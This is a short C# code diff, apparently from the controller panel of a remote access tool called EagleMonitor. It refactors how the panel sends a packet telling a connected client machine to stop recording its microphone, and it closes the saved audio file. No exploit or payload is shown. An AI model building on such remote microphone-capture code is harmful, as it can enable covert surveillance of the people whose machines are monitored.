@@ -45,7 +45,7 @@ namespace EagleMonitor.Forms
             ClientHandler.ClientHandlersList[baseIp].SendPacket(remoteAudioPacket);
         }
 
-        private async void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
+        private void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
         {
             if (captureGuna2ToggleSwitch.Checked)
             {
@@ -69,11 +69,12 @@ namespace EagleMonitor.Forms
                 {
                     this.loadingCircle1.Visible = false;
                     this.loadingCircle1.Active = false;
-                    RemoteAudioCapturePacket remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_OFF);
-                    remoteAudioCapturePacket.HWID = ClientHandler.ClientHandlersList[baseIp].HWID;
-
-                    await Task.Run(() => this.clientHandler.SendPacket(remoteAudioCapturePacket));
-                    await Task.Run(() => this.clientHandler.Dispose());
+                    RemoteAudioCapturePacket remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_OFF)
+                    {
+                        baseIp = this.baseIp,
+                        HWID = ClientHandler.ClientHandlersList[baseIp].HWID
+                    };
+                    this.clientHandler.SendPacket(remoteAudioCapturePacket);
                     ClientHandler.ClientHandlersList[baseIp].audioHelper.waveFileWriter.Close();
                     ClientHandler.ClientHandlersList[baseIp].audioHelper.bufferedWaveProvider.ClearBuffer();
                     hasAlreadyConnected = false;
@@ -84,6 +85,15 @@ namespace EagleMonitor.Forms
 
         private void closeButton_Click(object sender, EventArgs e)
         {
+            if (captureGuna2ToggleSwitch.Checked) 
+            {
+                RemoteAudioCapturePacket remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_OFF)
+                {
+                    baseIp = this.baseIp,
+                    HWID = ClientHandler.ClientHandlersList[baseIp].HWID
+                };
+                this.clientHandler.SendPacket(remoteAudioCapturePacket);
+            }
             this.Close();
         }
 
